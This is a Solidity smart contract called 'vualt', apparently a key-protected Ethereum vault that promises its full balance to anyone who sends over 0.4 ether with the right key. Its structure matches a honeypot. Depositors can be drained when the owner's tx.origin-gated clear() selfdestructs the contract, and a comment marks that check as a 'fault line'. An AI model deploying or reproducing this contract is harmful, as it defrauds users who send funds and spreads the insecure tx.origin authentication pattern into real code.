pragma solidity ^0.4.25;
contract vualt
{
    bytes32 keyHash;
    address owner;
    bytes32 wallet_id = 0x162fb6d4a567c777d990e7b7517f9068408a67c8cca7089c7649eeeb349ee523;
    constructor() public {
        owner = msg.sender;
    }
    function withdraw(string key) public payable
    {
        require(msg.sender == tx.origin);
        if(keyHash == keccak256(abi.encodePacked(key))) {
            if(msg.value > 0.4 ether) {
                msg.sender.transfer(address(this).balance);
            }
        }
    }
    function setup_key(string key) public
    {
        if (keyHash == 0x0) {
            keyHash = keccak256(abi.encodePacked(key));
        }
    }
    function change_hash(bytes32 new_hash) public
    {
        if (keyHash == 0x0) {
            keyHash = new_hash;
        }
    }
    function clear() public
    {
        require(tx.origin == owner);  // fault line
        selfdestruct(owner);
    }
    function get_id() public view returns(bytes32){
        return wallet_id;
    }
    function () public payable {
    }
}